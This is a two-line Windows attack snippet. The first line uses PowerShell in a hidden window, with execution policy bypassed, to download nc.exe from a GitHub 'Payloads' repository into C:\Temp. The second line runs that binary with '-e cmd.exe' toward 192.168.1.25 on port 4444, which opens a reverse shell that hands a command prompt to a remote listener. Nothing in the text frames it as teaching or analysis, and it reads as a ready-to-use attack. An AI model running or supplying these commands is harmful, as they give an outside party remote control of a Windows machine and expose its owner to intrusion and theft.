powershell -Command "powershell -ExecutionPolicy bypass -noprofile -windowstyle hidden -command (New-Object System.Net.WebClient).DownloadFile('https://github.com/Vimarkov/Payloads/blob/main/nc.exe?raw=true','C:\Temp\nc.exe');"

C:\Temp\nc.exe -e cmd.exe 192.168.1.25 4444
